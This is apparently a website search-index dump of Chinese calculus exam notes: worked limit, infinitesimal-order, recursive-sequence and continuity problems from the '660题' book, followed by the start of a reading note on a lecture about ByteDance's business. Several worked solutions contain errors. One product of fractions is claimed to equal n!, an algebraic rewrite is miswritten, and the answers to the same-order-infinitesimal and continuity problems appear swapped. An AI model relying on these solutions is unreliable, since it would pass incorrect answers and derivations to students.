$$ \u5206\u6790 \u65b9\u6cd5\u4e00\uff1a\u7528\u7b49\u4ef7\u65e0\u7a77\u5c0f\u4ee3\u6362 $$ \\sqrt[n]{1 + x} - 1 = (1 + x)^{\\frac{1}{m} - 1} \\sim \\frac{x}{m}(x \\to 0) $$ \u5f97 $$ \\sqrt[n]{\\cos x} - 1 = \\sqrt[n]{1 + \\cos x - 1} - 1 \\sim \\frac{\\cos x - 1}{m}(x \\to 0) $$ \u5bf9\u539f\u5f0f\u8fdb\u884c\u62c6\u9879 $$ {\\begin{aligned} I =& \\lim\\limits_{x \\to 0}{(\\frac{\\sqrt[]{(\\cos x - 1) + 1} - 1}{\\cos x - 1})} \\times \\lim\\limits_{x \\to 0}{(\\frac{\\sqrt[3]{(\\cos x - 1) + 1} - 1}{\\cos x - 1})} \\times \\cdots \\\\ &\\times \\lim\\limits_{x \\to 0}{(\\frac{\\sqrt[n]{(\\cos x - 1) + 1} - 1}{\\cos x - 1})} \\\\ =& \\lim\\limits_{x \\to 0}{\\frac{\\dfrac{1}{2}(\\cos x - 1)}{(\\cos x - 1)} } \\times {\\frac{\\dfrac{1}{3}(\\cos x - 1)}{(\\cos x - 1)} } \\times \\cdots {\\frac{\\dfrac{1}{n}(\\cos x - 1)}{(\\cos x - 1)} } \\\\ =& \\lim\\limits_{x \\to 0}{\\frac{1}{2} \\times \\frac{1}{3} \\times \\cdots \\times \\frac{1}{n}} = n ! \\\\ \\end{aligned} } $$ \u65b9\u6cd5\u4e8c\uff1a\u4f7f\u7528\u6d1b\u5fc5\u8fbe\u6cd5\u5219 1.3. \u5e42\u6307\u578b\u6c42\u6781\u9650 # 1.3.1. \u6765\u6e90:\u300a660\u9898\u300b - 8 I = \\lim\\limits_{x \\to \\infty}{(e^{x^2} + x^3)^{\\frac{1}{x^2}}} = \\underline{\\hspace*{1cm}}. \u6ce8\u610f \uff1a\u6b64\u5904\u4e3a \\infty^0 \u578b\u6781\u9650\uff0c\u4e0d\u80fd\u76f4\u63a5\u5f53\u4f5c 1^\\infty \u578b\u6781\u9650\u4f7f\u7528\u91cd\u8981\u6781\u9650\u4e8c\u8fdb\u884c\u6c42\u89e3 \u7b54\u6848 $$e$$ \u5206\u6790 \u8fd9\u662f$\\infty^0$\u578b\u6781\u9650\uff0c\u5148\u4f5c\u6052\u7b49\u53d8\u5f62\uff0c\u8f6c\u6362\u4e3a$1^\\infty$\u578b\u6781\u9650 $$ I = \\lim\\limits_{x \\to \\infty}{(e^{x^2} +(1 + \\frac{x^3}{e^{x^2}}))^{\\dfrac{1}{x^2}}} = e \\lim\\limits_{x \\to \\infty}{e^{\\dfrac{1}{x^2} \\ln (1 + \\dfrac{x^3}{e^{x^2}})}} $$ \u53c8 $$ { \\begin{aligned} &\\lim\\limits_{x \\to \\infty}{{\\dfrac{1}{x^2} \\ln (1 + \\dfrac{x^3}{e^{x^2}})}} \\xlongequal[\\text{\u56e0\u5b50\u66ff\u6362}]{\\text{\u7b49\u4ef7\u65e0\u7a77\u5c0f}} \\lim\\limits_{x \\to \\infty}{{ (\\dfrac{1}{x^2} \\cdot \\dfrac{x^3}{e^{x^2}})}} & \\\\ =& \\lim\\limits_{x \\to \\infty}{\\frac{x}{e^{x^2}}} \\xlongequal[\\text{\u6d1b\u5fc5\u8fbe\u6cd5\u5219}]{\\dfrac{\\infty}{\\infty}} \\lim\\limits_{x \\to \\infty}{\\frac{1}{2xe^{x^2}}} = 0& \\\\ \\end{aligned} } $$ \u5176\u4e2d $$ \\ln(1 + \\frac{x^3}{e^{x^2}}) \\sim \\frac{x^3}{e^{x^2}}(x \\to \\infty) $$ \u56e0\u6b64 $$ I = e \\cdot e^0 = e $$ 1.4. \u5df2\u77e5\u6781\u9650\u6c42\u53c2\u6570 # 1.5. \u540c\u9636\u65e0\u7a77\u5c0f # 1.5.1. \u6765\u6e90:\u300a660\u9898\u300b - 21 \u5df2\u77e5\u5f53 x \\to 0 \u65f6 F(x) = \\int_0^{x - \\sin(x)} \\ln (1 + t) dt \u662f x^n \u7684\u540c\u9636\u65e0\u7a77\u5c0f\uff0c\u5219 n= \\underline{\\hspace*{1cm}}. \u6ce8\u610f \uff1a\u5bf9\u53d8\u4e0a\u9650\u79ef\u5206\u8fdb\u884c\u6c42\u5bfc\u65f6\uff0c\u4e0d\u80fd\u5ffd\u7565\u5bf9\u4e0a\u9650\u7684\u6c42\u5bfc \u7b54\u6848 $$ (-\\infty, +\\infty) $$ 1.6. \u6570\u5217\u6781\u9650\u4e0e\u9012\u63a8\u5173\u7cfb # 1.6.1. \u6765\u6e90:\u300a660\u9898\u300b - 19 \u8bbe x_0 = 0, x_n = \\dfrac{1 + 2x_{n - 1}}{1 + x_{n - 1}}(n = 1, 2, 3, \\cdots) \uff0c\u5219 \\lim\\limits_{x \\to \\infty}{x_n} = \\underline{\\hspace*{1cm}} . \u6ce8\u610f \uff1a f(x) \\le a \u8868\u793a a \u4e3a\u51fd\u6570\u7684\u4e0a\u754c\uff0c\u4e0d\u80fd\u8bf4\u660e a \u4e3a\u51fd\u6570\u7684\u6781\u9650 \u7b54\u6848 $$ \\frac{1 + \\sqrt[]{5}}{2} $$ \u5206\u6790 \u663e\u7136 $$ 0 < x_n \\frac{2(1 + x_{n - 1})}{1 + x_{n - 1}} = 2 - \\frac{1}{1 + x_{n - 1}} < 2 \\hspace*{0.5cm} (n = 1, 2, 3, \\cdots) $$ \u5373$x_n$\u6709\u754c\u3002 $$ { \\begin{aligned} \\text{\u4ee4}f(x) =& 2 - \\frac{1}{1 + x} \\Rightarrow f(x) \\nearrow (x \\ge 0) & \\\\ \\Rightarrow & x_{n - 1} = f(x) (n = 1,2,3, \\cdots) \\text{\u5355\u8c03}& \\\\ \\end{aligned} } $$ \u56e0\u6b64$x_n$\u6536\u655b\uff0c\u8bb0$ \\lim\\limits_{x \\to \\infty}{x_n} = a $. \u5bf9\u9012\u5f52\u65b9\u7a0b$x_n = \\dfrac{1 + 2x_n}{1 + x_{n - 1}} $ \u4e24\u8fb9\u53d6\u6781\u9650\u5f97 $$ a = \\frac{1 + 2a}{1 + a} $$ \u5373$a^2 - a - 1 = 0$\uff0c\u89e3\u5f97$a = \\dfrac{1 + \\sqrt[]{5}}{2}$ 1.6.2. \u4ea4\u53c9\u8003\u70b9\u94fe\u63a5 \u300a660\u9898\u300b - 25 (\u51fd\u6570\u8fde\u7eed) 2. \u51fd\u6570\u7684\u8fde\u7eed\u6027 # 2.1. \u51fd\u6570\u8fde\u7eed # 2.1.1. \u6765\u6e90:\u300a660\u9898\u300b - 25 \u8bbe f(x) = \\lim\\limits_{n \\to \\infty}{\\dfrac{x + x^2e^{nx}}{1 + e^{nx}}} \uff0c\u5219 f(x) \u7684\u8fde\u7eed\u533a\u95f4\u662f \\underline{\\hspace*{1cm}} . \u6ce8\u610f \uff1a e^x \u51fd\u6570\u5728\u8d8b\u5411\u4e8e\u6b63\u65e0\u7a77\u548c\u8d1f\u65e0\u7a77\u65f6\u6781\u9650\u4e0d\u76f8\u540c \u7b54\u6848 $$ 6 $$ 2.2. \u95f4\u65ad\u70b9 # 2.3. \u53ef\u5bfc\u3001\u8fde\u7eed\u6c42\u76f8\u5173\u53c2\u6570 #","title":"1.\u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed \u9519\u9898"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#_1","text":"","title":"\u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed \u9519\u9898"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#_2","text":"\u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed \u9519\u9898 \u76ee\u5f55 1. \u6781\u9650 1.1. \u6781\u9650\u5b9a\u4e49 1.2. \u6c42\u6781\u9650 1.3. \u5e42\u6307\u578b\u6c42\u6781\u9650 1.4. \u5df2\u77e5\u6781\u9650\u6c42\u53c2\u6570 1.5. \u540c\u9636\u65e0\u7a77\u5c0f 1.6. \u6570\u5217\u6781\u9650\u4e0e\u9012\u63a8\u5173\u7cfb 2. \u51fd\u6570\u7684\u8fde\u7eed\u6027 2.1. \u51fd\u6570\u8fde\u7eed 2.2. \u95f4\u65ad\u70b9 2.3. \u53ef\u5bfc\u3001\u8fde\u7eed\u6c42\u76f8\u5173\u53c2\u6570","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#1","text":"","title":"1. \u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#11","text":"","title":"1.1. \u6781\u9650\u5b9a\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#12","text":"","title":"1.2. \u6c42\u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#13","text":"","title":"1.3. \u5e42\u6307\u578b\u6c42\u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#14","text":"","title":"1.4. \u5df2\u77e5\u6781\u9650\u6c42\u53c2\u6570"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#15","text":"","title":"1.5. \u540c\u9636\u65e0\u7a77\u5c0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#16","text":"","title":"1.6. \u6570\u5217\u6781\u9650\u4e0e\u9012\u63a8\u5173\u7cfb"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#2","text":"","title":"2. \u51fd\u6570\u7684\u8fde\u7eed\u6027"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#21","text":"","title":"2.1. \u51fd\u6570\u8fde\u7eed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#22","text":"","title":"2.2. \u95f4\u65ad\u70b9"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/#23","text":"","title":"2.3. \u53ef\u5bfc\u3001\u8fde\u7eed\u6c42\u76f8\u5173\u53c2\u6570"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/","text":"\u5434\u4f2f\u51e1-\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba-\u5b57\u8282\u8df3\u52a8\u7bc7 # \u76ee\u5f55 # \u5434\u4f2f\u51e1-\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba-\u5b57\u8282\u8df3\u52a8\u7bc7 \u76ee\u5f55 1. \u80cc\u666f 2. \u5b57\u8282\u8df3\u52a8\u7684\u4f53\u91cf 3. \u4eceLabel\u5230Tag 4. \u5b57\u8282\u8df3\u52a8\u7684\u5927\u4e2d\u53f0\u3001\u5c0f\u524d\u53f0 5. OKR 6. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u6700\u8fd1\u5728\u5f97\u5230APP\u542c\u4e86\u5434\u4f2f\u51e1\u8001\u5e08\u7684 \u300a\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba\u300b 1 \u4e2d\u300a\u5b57\u8282\u8df3\u52a8\u4e3a\u4ec0\u4e48\u80fd\u6301\u7eed\u51fa\u7206\u54c1\u300b\u8fd9\u4e24\u8bb2\u8bfe\u7a0b\uff0c\u6211\u611f\u89c9\u5bf9\u5b57\u8282\u8df3\u52a8\u8fd9\u5bb6\u516c\u53f8\u591a\u4e86\u4e00\u4e9b\u4e86\u89e3\uff0c\u6240\u4ee5\u5e0c\u671b\u5199\u4e00\u7bc7\u7b14\u8bb0\u6765\u603b\u7ed3\u542c\u8bfe\u7684\u5185\u5bb9\u3002 2. \u5b57\u8282\u8df3\u52a8\u7684\u4f53\u91cf # \u6211\u57285\u670830\u65e5\u7684 \u90b5\u8861\u5934\u6761 2 \u4e2d\u4e5f\u542c\u5230\u4e86\u5b57\u8282\u8df3\u52a8\u7684\u6d88\u606f\uff0c\u4f7f\u6211\u5bf9\u5b57\u8282\u8df3\u52a8\u76ee\u524d\u7684\u4f53\u91cf\u6709\u4e86\u4e00\u4e2a\u5927\u6982\u7684\u8ba4\u8bc6\uff0c\u5185\u5bb9\u5982\u4e0b\u3002 \u5f6d\u535a\u62a5\u9053\uff1a\u4eca\u65e5\u5934\u6761\u53bb\u5e74\u5229\u6da6\u8d85\u8fc730\u4ebf\u7f8e\u5143\uff0c\u8425\u6536170\u4ebf\u7f8e\u5143 \u4e0a\u5468\uff0c\u5f6d\u535a\u5546\u4e1a\u5468\u520a\u62a5\u9053\uff0c\u4eca\u65e5\u5934\u6761\u7684\u6bcd\u516c\u53f8\u5b57\u8282\u8df3\u52a8\uff0c\u53bb\u5e74\u5168\u5e74\u5b9e\u73b0\u8425\u6536 170\u4ebf\u7f8e\u5143 \uff0c\u8f832018\u5e74\u540c\u6bd4\u589e\u957f 120% \uff0c\u8fd9\u4e2a\u6570\u5b57\u5df2\u7ecf\u8d85\u8fc7\u4e86\u767e\u5ea6\u3002\u6b64\u5916\uff0c\u53bb\u5e74\u4eca\u65e5\u5934\u6761\u7684\u5229\u6da6\u8d85\u8fc7 30\u4ebf\u7f8e\u5143 \u3002 \u636e\u65b0\u52a0\u5761\u6295\u7814\u516c\u53f8DZT Research\u7684\u5206\u6790\u5e08\u9884\u4f30\uff0c\u5982\u679c\u5b57\u8282\u8df3\u52a8\u4e0a\u5e02\uff0c\u5e02\u573a\u4f30\u503c\u5e94\u8be5\u5728 1500\u4ebf-1800\u4ebf\u7f8e\u5143 \u4e4b\u95f4\uff0c \u8dfb\u8eab\u5168\u7403\u6700\u5927\u7684\u79d1\u6280\u516c\u53f8\u4e4b\u5217 \u3002\u4f46\u636e\u5f6d\u535a\u5206\u6790\uff0c\u5b57\u8282\u8df3\u52a8\u5b8c\u5168\u6ca1\u6709\u4e0a\u5e02\u538b\u529b\uff0c\u56e0\u4e3a\u516c\u53f8\u8d26\u9762\u4e0a\u7684\u73b0\u91d1\u9ad8\u8fbe 60\u4ebf\u7f8e\u5143 \uff0c\u53ef\u4ee5\u8bf4\u5bb6\u5e95\u6df1\u539a\u3002 \u5b57\u8282\u8df3\u52a8\u6700\u4e3b\u8981\u7684\u6536\u5165\u6765\u6e90\u662f\u5e7f\u544a\u3002\u6b64\u6b21\u75ab\u60c5\u4f1a\u5bf9\u5e7f\u544a\u6536\u5165\u6709\u591a\u5927\u5f71\u54cd\uff0c\u76ee\u524d\u8fd8\u6ca1\u6709\u516c\u5f00\u4fe1\u606f\u3002\u4e0d\u8fc7\u5f6d\u535a\u7684\u62a5\u9053\u79f0\uff0c\u4eca\u5e74\u5b57\u8282\u8df3\u52a8\u7684\u4eba\u5458\u6269\u5f20\u4ecd\u7136\u51f6\u731b\uff0c\u8ba1\u5212\u65b0\u589e\u5c97\u4f4d 40000\u4e2a \uff0c\u4e5f\u5c31\u662f\u8bf4\u5230\u5e74\u5e95\uff0c\u5b57\u8282\u8df3\u52a8\u7684\u5168\u7403\u5458\u5de5\u4eba\u6570\u5c06\u7a81\u7834 10\u4e07\u4eba \uff0c\u76f4\u8ffd\u963f\u91cc\u5df4\u5df4\u3002 3. \u4eceLabel\u5230Tag # \u5b57\u8282\u8df3\u52a8\u6210\u7acb\u4e8e2012\u5e74\uff0c\u5230\u73b0\u5728\u4e0d\u8fc78\u5e74\uff0c\u5374\u5df2\u7ecf\u5728\u5168\u7403\u6709\u4e86\u8d85\u8fc77\u4ebf\u7684\u603b\u65e5\u6d3b\u7528\u6237\uff0c\u4e3a\u4ec0\u4e48\u5b83\u80fd\u591f\u6210\u529f\uff1f \u6211\u4eec\u4ece\u7528\u6237\u6700\u719f\u6089\u7684\u4eca\u65e5\u5934\u6761\uff082012\u4e0a\u7ebf\uff09\u548c\u6296\u97f3\uff082016\u4e0a\u7ebf\uff09\u5165\u624b\u8fdb\u884c\u5206\u6790\u3002\u4ed6\u4eec\u4e0e\u4ee5\u524d\u7684\u4e92\u8054\u7f51\u5185\u5bb9\u4ea7\u54c1\u6700\u4e0d\u540c\u7684\u5730\u65b9\u5c31\u5728\u4e8e\u5c06\u5185\u5bb9\u7684\u66dd\u5149\u4ece\u4ee5\u7528\u6237\u641c\u7d22\u4e3a\u4e3b\u6539\u4e3a\u4e86\u4ee5\u7b97\u6cd5\u63a8\u8350\u4e3a\u4e3b\u3002 \u4e3a\u4ec0\u4e48\u5b57\u8282\u8df3\u52a8\u80fd\u591f\u6bd4\u7528\u6237\u66f4\u4e86\u89e3\u4ed6\u4eec\u81ea\u5df1\u60f3\u8981\u770b\u5230\u4ec0\u4e48\u5185\u5bb9\u5462\uff1f\u8fd9\u5c31\u6d89\u53ca\u5230\u4e86\u5434\u4f2f\u51e1\u8001\u5e08\u8bf4\u7684\u4ece Label\u601d\u7ef4 \u5230 Tag\u601d\u7ef4 \u7684\u8f6c\u53d8\u3002 Label \u548c Tag \u867d\u7136\u7ffb\u8bd1\u6210\u4e2d\u6587\u90fd\u53eb\u6807\u7b7e\uff0c\u4f46 Label \u662f\u4e00\u79cd\u7c97\u7c92\u5ea6\u7684\u6807\u7b7e\uff0c\u6bd4\u5982\u5bcc\u4eba\u9636\u7ea7\u3001\u4e2d\u4ea7\u9636\u7ea7\uff0c\u4e00\u4e2a\u4eba\u8eab\u4e0a\u5f80\u5f80\u4e0d\u4f1a\u6709\u5f88\u591a Label \u3002\u800c Tag \u5219\u662f\u4e00\u79cd\u66f4\u52a0\u7ec6\u7c92\u5ea6\u3001\u788e\u7247\u5316\u7684\u6807\u7b7e\uff0c\u6bd4\u5982\u4f60\u559c\u6b22\u7684\u662f\u732b\u8fd8\u662f\u72d7\uff0c\u559c\u6b22\u67ef\u57fa\u8fd8\u662f\u54c8\u58eb\u5947\uff0c\u4e00\u4e2a\u4eba\u8eab\u4e0a\u662f\u53ef\u4ee5\u6709\u5f88\u591a Tag \u7684\u3002 \u4ec0\u4e48\u662f Label \u601d\u7ef4\u5462\uff0c\u6bd4\u5982\u6211\u4eec\u5e38\u7528\u7684\u57fa\u4e8e\u5e74\u9f84\u6bb5\u7684\u7528\u6237\u7fa4\u5206\u7c7b\u65b9\u6cd5\uff0c\u628a\u7528\u6237\u5206\u4e3a\u5e7c\u513f\u3001\u9752\u5c11\u5e74\u3001\u4e2d\u5e74\u548c\u8001\u5e74\u51e0\u4e2a\u7fa4\u4f53\uff0c\u7136\u540e\u7814\u7a76\u6211\u4eec\u7684\u4ea7\u54c1\u8981\u9762\u5411\u54ea\u4e2a\u7fa4\u4f53\uff0c\u8fd9\u4e2a\u7fa4\u4f53\u4ed6\u4eec\u7684\u60f3\u6cd5\u662f\u600e\u4e48\u6837\u7684\uff0c\u4ed6\u4eec\u559c\u6b22\u4ec0\u4e48\u6837\u7684\u4e1c\u897f\u3002\u4e5f\u8bb8\u8fd8\u53ef\u4ee5\u52a0\u5165\u6027\u522b\u3001\u5a5a\u59fb\u72b6\u51b5\u3001\u6536\u5165\u6c34\u5e73\u3001\u6559\u80b2\u6c34\u5e73\u3001\u5c45\u4f4f\u5730\u7b49\u7b49\u56e0\u7d20\u6765\u8fdb\u884c\u8003\u91cf\uff0c\u6700\u540e\u5f97\u51fa\u4e00\u4e2a\u7528\u6237\u753b\u50cf\uff0c\u8ba9\u6211\u4eec\u7684\u4ea7\u54c1\u5c3d\u53ef\u80fd\u5730\u80fd\u591f\u53d7\u8fd9\u4e2a\u7fa4\u4f53\u559c\u6b22\u3002 \u8fd9\u6837\u7684\u65b9\u6cd5\u770b\u8d77\u6765\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u8003\u8651\u5f97\u4f3c\u4e4e\u5f88\u5168\u9762\u3002\u4f46\u662f\u8fd9\u4e2a\u6a21\u578b\u5176\u5b9e\u9690\u542b\u4e86\u4e00\u4e2a \u5047\u8bbe \uff0c\u5c31\u662f\u76f8\u540c\u5e74\u9f84\u3001\u6027\u522b\u3001\u5a5a\u59fb\u72b6\u51b5\u3001\u6536\u5165\u6c34\u5e73\u3001\u6559\u80b2\u6c34\u5e73\u548c\u5c45\u4f4f\u5730\u7684\u4eba\uff0c\u4ed6\u4eec\u559c\u6b22\u7684\u4e1c\u897f\u662f\u4e00\u6837\u7684\u3002 \u8fd9\u4e2a\u5047\u8bbe\u6210\u7acb\u5417\uff1f\u6211\u4eec\u53ef\u4ee5\u8bbe\u60f3\u4e00\u4e0b\uff0c\u548c\u4f60\u5728\u4e00\u4e2a\u529e\u516c\u5ba4\u7684\u540c\u4e8b\uff0c\u4ed6\u548c\u4f60\u5e74\u9f84\u3001\u6536\u5165\u7b49\u7b49\u65b9\u9762\u90fd\u5dee\u4e0d\u591a\uff0c\u4f60\u4eec\u4e24\u4e2a\u559c\u6b22\u7684\u4e1c\u897f\u4f1a\u662f\u4e00\u6837\u7684\u5417\uff1f\u5f88\u660e\u663e\uff0c\u8fd9\u4e2a\u5047\u8bbe\u5e76\u4e0d\u6210\u7acb\uff0c\u4eba\u548c\u4eba\u4e4b\u95f4\u7684\u5dee\u522b\u6709\u65f6\u5019\u4f1a\u5927\u5f97\u8d85\u4e4e\u6211\u4eec\u7684\u60f3\u8c61\u3002 \u90a3\u4e48 Tag \u601d\u7ef4\u53c8\u662f\u4ec0\u4e48\u5462\uff0c\u5982\u679c\u7528\u51b3\u7b56\u6811\u6765\u505a\u7c7b\u6bd4\uff0c\u4f60\u548c\u4f60\u7684\u540c\u4e8b\u6bcf\u4e00\u6b21\u4e0d\u540c\u7684\u70b9\u51fb\u90fd\u4f1a\u88ab\u6253\u4e0a\u4e0d\u540c\u7684 Tag \uff0c\u88ab\u5206\u88c2\u5230\u4e0d\u540c\u7684\u5206\u652f\u4e0a\u53bb\uff0c\u4f60\u4eec\u4e24\u4e2a\u5728\u51b3\u7b56\u6811\u4e0a\u7684\u8ddd\u79bb\u4e5f\u5c31\u8d8a\u6765\u8d8a\u8fdc\uff0c\u770b\u5230\u7684\u5185\u5bb9\u4e5f\u5c31\u8d8a\u6765\u8d8a\u4e0d\u76f8\u540c\u3002 \u4e3a\u4e86\u63a8\u9001\u4f60\u559c\u6b22\u7684\u5185\u5bb9\u7ed9\u4f60\uff0c\u4f60\u4f1a\u88ab\u6253\u4e0a\u591a\u5c11\u4e2a Tag \u5462\uff1f\u6211\u57282019\u5e74\u66fe\u7ecf\u542c\u8fc7\u65b0\u6d6a\u5fae\u535a\u63a8\u8350\u7cfb\u7edf\u90e8\u95e8\u7684\u5de5\u7a0b\u5e08\u505a\u7684\u4e00\u6b21\u5206\u4eab\uff0c\u4ed6\u4eec\u7528\u6765\u505a\u4e2a\u6027\u5316 Push \u6240\u7528\u5230\u7684\u6a21\u578b\uff0c\u4e5f\u5c31\u662f\u5fae\u535a\u901a\u8fc7\u901a\u77e5\u53d1\u9001\u7ed9\u4f60\u4e00\u4e9b\u4f60\u53ef\u80fd\u611f\u5174\u8da3\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u52a8\u4f5c\u7528\u5230\u7684\u6a21\u578b\uff0c\u5176\u7279\u5f81\u89c4\u6a21\u5df2\u7ecf\u8fbe\u5230\u4e86\u5341\u4e07\u7ef4\u7684\u7ea7\u522b\u3002 \u5982\u679c\u8981\u5bf9\u8fd9\u90e8\u5206\u5185\u5bb9\u505a\u4e00\u4e2a\u603b\u7ed3\uff0c\u90a3\u5c31\u662f \u5b57\u8282\u8df3\u52a8\u901a\u8fc7\u5927\u6570\u636e\u548c Tag \u601d\u7ef4\uff0c\u5b9e\u73b0\u4e86\u6bd4\u4f60\u81ea\u5df1\u66f4\u61c2\u4f60\u60f3\u8981\u770b\u4ec0\u4e48\u5185\u5bb9 \u3002 4. \u5b57\u8282\u8df3\u52a8\u7684\u5927\u4e2d\u53f0\u3001\u5c0f\u524d\u53f0 # \u6570\u636e\u4e2d\u53f0\u4f7f\u5b57\u8282\u8df3\u52a8\u4e0d\u540c\u4ea7\u54c1\u4e4b\u95f4\u83b7\u53d6\u7684\u7684\u7528\u6237\u6570\u636e\u53ef\u4ee5\u5171\u4eab\uff0c\u6280\u672f\u4e2d\u53f0\u4e3a\u5176\u4ea7\u54c1\u7684\u5f00\u53d1\u4e0e\u8fed\u4ee3\u63d0\u4f9b\u4e86\u53ef\u590d\u7528\u7684\u7ec4\u4ef6\u3002 \u5b57\u8282\u8df3\u52a8\u7684\u65e0\u7ebf\u7814\u53d1\u5e73\u53f0\u8d1f\u8d23\u4eba\u5434\u601d\u632f\u8001\u5e08\u66fe\u5728 GMTC \u5168\u7403\u5927\u524d\u7aef\u6280\u672f\u5927\u4f1a 3 \u4e0a\u5bf9\u4e2d\u53f0\u505a\u4e86\u89e3\u91ca\u3002 \u968f\u7740\u4e1a\u52a1\u7684\u53d1\u5c55\u4ee5\u53ca\u5f00\u53d1\u4eba\u5458\u589e\u52a0\u3001\u6bcf\u4e2a\u5927\u578b\u4ea7\u54c1\u90fd\u6709\u5bf9\u5e94\u6570\u91cf\u7684\u5f00\u53d1\u540c\u5b66\u4f5c\u4e3a\u652f\u6491\uff0c\u800c\u5728\u957f\u671f\u7684\u534f\u4f5c\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u5404\u5927\u5f00\u53d1\u56e2\u961f\u90fd\u4f1a\u9047\u5230\u6bd4\u8f83\u6709\u5171\u6027\u7684\u96be\u70b9\uff0c\u6bd4\u5982\u6784\u5efa\u901f\u5ea6\u6162\u3001\u5f00\u53d1\u6d4b\u8bd5\u5468\u671f\u957f\u3001\u534f\u4f5c\u56f0\u96be\u7b49\u95ee\u9898\uff0c\u800c\u5728\u5feb\u901f\u7684\u4e1a\u52a1\u8fed\u4ee3\u4e2d\uff0c\u5404\